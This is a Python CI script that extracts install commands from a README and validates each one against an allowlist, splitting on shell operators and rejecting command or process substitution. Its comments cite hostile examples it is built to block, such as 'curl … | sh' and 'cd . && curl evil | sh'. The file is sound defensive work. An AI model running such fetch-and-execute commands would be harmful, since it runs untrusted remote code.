"""Extract install commands from README.md for docs-as-tested CI.

Strict parser for the ``## Install`` section: expects exactly the methods
listed in ``expected_methods`` and no others; expects each subsection to
contain exactly one fenced ``bash`` code block. Any deviation raises
``ExtractionError`` with a diagnostic pointing at the specific mismatch.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path


class ExtractionError(RuntimeError):
    """Raised when README structure violates the extractor's contract."""


METHOD_HEADINGS = {
    "pipx": "recommended (via pipx):",
    "brew": "or via homebrew (macos):",
    "pip": "or with pip:",
    "source": "or from source:",
    "docker": "or via docker (headless fleet mode):",
}

# Defense-in-depth: any extracted command whose first token is not one of these
# is rejected. Blocks a fork-PR that edits README's ## Install section from
# smuggling `curl … | sh`, `wget …`, `bash -c …`, etc. into the docs-as-tested
# CI legs that eval() these lines (pip / pipx / brew jobs).
#
# Deliberately narrow: only verbs the shipped README actually uses. `python` /
# `python3` were dropped — CI never invokes them via the extractor and allowing
# them would open `python -c "…"` arbitrary-code execution. Chained-command
# hardening (below) means `chmod` must be present because README's docker
# block uses `mkdir -p results && chmod 777 results`.
_ALLOWED_FIRST_TOKENS = frozenset({
    "pip", "pipx", "brew", "docker", "git", "cd", "mkdir", "chmod",
})

# Shell operators that chain a second command. First-token allowlisting on the
# whole line lets `cd . && curl … | sh` slip through; split on these and
# validate each fragment's first token. Order matters: two-char operators
# (`&&`, `||`) must precede their single-char counterparts so the regex
# consumes the longer form first.
_SHELL_OPERATOR_SPLIT = re.compile(r"&&|\|\||;|\||&")


def extract_install_commands(
    readme_path: Path,
    expected_methods: tuple[str, ...],
) -> dict[str, list[str]]:
    if not readme_path.is_file():
        raise ExtractionError(f"README file not found: {readme_path}")
    text = readme_path.read_text(encoding="utf-8")

    install_match = re.search(
        r"^## Install\s*\n(.*?)(?=^## |\Z)",
        text,
        flags=re.MULTILINE | re.DOTALL,
    )
    if install_match is None:
        raise ExtractionError(
            f"{readme_path}: no '## Install' section found"
        )
    install_body = install_match.group(1)

    result: dict[str, list[str]] = {}
    for method in expected_methods:
        heading = METHOD_HEADINGS[method]
        pattern = (
            re.escape(heading)
            + r"\s*\n\s*```bash\s*\n(.*?)\n```"
        )
        block = re.search(pattern, install_body, flags=re.IGNORECASE | re.DOTALL)
        if block is None:
            raise ExtractionError(
                f"{readme_path}: expected method '{method}' — "
                f"could not find heading '{heading}' followed by a "
                f"```bash code block"
            )
        commands = [line.strip() for line in block.group(1).splitlines() if line.strip()]
        for cmd in commands:
            _validate_command(readme_path, method, cmd)
        result[method] = commands

    return result


def _validate_command(readme_path: Path, method: str, cmd: str) -> None:
    """Reject anything whose first token isn't a known install verb.

    Line-continuation fragments (leading ``-`` flag or ``ghcr.io/`` image ref
    for the docker block) are permitted — they are not standalone verbs and
    the workflow's docker leg does not ``eval`` them line-by-line.

    Chained-command hardening: naive first-token checking lets
    ``cd . && curl evil | sh`` bypass — every sub-command after a shell
    operator (``&&``, ``||``, ``;``, ``|``, and the single ``&`` background
    separator) is validated separately. Command substitution (``$(…)``,
    backticks) and process substitution (``<(…)``, ``>(…)``) are rejected
    outright.
    """
    stripped = cmd.lstrip()
    if not stripped or stripped.startswith("#"):
        return

    if "$(" in stripped or "`" in stripped:
        raise ExtractionError(
            f"{readme_path}: method '{method}' contains disallowed command "
            f"substitution ($(...) or backticks). Full line: {cmd!r}"
        )

    if "<(" in stripped or ">(" in stripped:
        raise ExtractionError(
            f"{readme_path}: method '{method}' contains disallowed process "
            f"substitution (<(...) or >(...)). Full line: {cmd!r}"
        )

    for sub in _SHELL_OPERATOR_SPLIT.split(stripped):
        fragment = sub.strip()
        if not fragment:
            continue
        first = fragment.split(None, 1)[0]
        if first.startswith("-") or first.startswith("ghcr.io/"):
            continue
        if first not in _ALLOWED_FIRST_TOKENS:
            raise ExtractionError(
                f"{readme_path}: method '{method}' contains disallowed command — "
                f"token '{first}' not in allowlist "
                f"({', '.join(sorted(_ALLOWED_FIRST_TOKENS))}). Full line: {cmd!r}"
            )


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--readme", required=True, type=Path)
    parser.add_argument(
        "--method",
        required=True,
        choices=sorted(METHOD_HEADINGS.keys()),
    )
    args = parser.parse_args(argv)

    try:
        commands = extract_install_commands(
            readme_path=args.readme,
            expected_methods=(args.method,),
        )
    except ExtractionError as exc:
        print(str(exc), file=sys.stderr)
        return 1

    json.dump(commands[args.method], sys.stdout)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
